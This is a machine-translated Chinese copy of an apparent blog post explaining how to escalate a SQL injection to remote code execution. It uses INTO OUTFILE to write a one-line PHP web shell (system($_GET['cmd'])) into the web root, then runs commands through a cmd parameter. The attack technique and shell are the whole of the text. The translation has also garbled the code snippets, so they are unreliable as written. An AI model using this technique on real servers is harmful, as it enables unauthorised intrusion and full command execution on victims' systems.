<html>
<head>
<title>Jumping from SQL injection to RCE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从SQL注入跳到RCE</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/jumping-from-sql-injection-to-rce-ea354e5d4f94?source=collection_archive---------0-----------------------#2021-03-26">https://infosecwriteups.com/jumping-from-sql-injection-to-rce-ea354e5d4f94?source=collection_archive---------0-----------------------#2021-03-26</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="8bfe" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在这种情况下，我们将利用sql注入错误来“跳转”到其他漏洞。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div class="gh gi ko"><img src="../Images/0e65208c0ee43fa5336b3829f672d322.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/0*KODQk8jzgjGi6jjH"/></div></figure><p id="687b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">为此，我们必须拥有写权限并知道服务器装载的路径，他们可以使用@ <a class="ae kw" href="http://twitter.com/datadir" rel="noopener ugc nofollow" target="_blank"> @datadir </a>来完成，在这种情况下，我在错误屏幕上显示了路径</p><p id="4f86" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">有了路径后，我们要做的是注入外壳，在这种情况下，这是一个简单的php后门:</p><p id="993c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"> php system ($ _ GET [“cmd”]); ?&gt;</p><p id="5e86" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们将使用以下方法注入它:</p><p id="73b2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">INTO + OUTFILE + 'path/name.php '</p><p id="3b5d" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">他们注入和文件将被加载到服务器上，现在我们访问。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kx"><img src="../Images/248175e6323200eef017e0027a672b52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*INeAxTKBcuj4kFNz"/></div></div></figure><p id="5a65" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">输入文件后，将出现以下内容:</p><p id="30ff" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">警告:system () [function.system]:不能在第1行的F:\ content site \ cmd.php中执行空白命令</p><p id="999e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是因为我们已经在使用php system()函数，我们必须将它与一些命令一起使用</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kx"><img src="../Images/086c5d84a55b337280b38149574492c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ev2RLGO2H8_YgqiW"/></div></div></figure><p id="1260" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在，最后一件事是使用cmd参数添加要执行的命令，该参数是我们在注入中使用的参数:($ _GET ["cmd"])</p><p id="b70f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">cmd.php？cmd =命令</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi kx"><img src="../Images/69d374880b77e9babbafb247f550810a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*7ch7IRKM3L-AyG7g"/></div></div></figure><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi lc"><img src="../Images/d6eb3f5f8bcdf954ae8afbb36bd8ef0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*qBrwh2fbbMyUr1b9"/></div></div></figure><p id="d931" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这样你就可以以一种超快的方式从sql注入到RCE。</p></div></div>    
</body>
</html>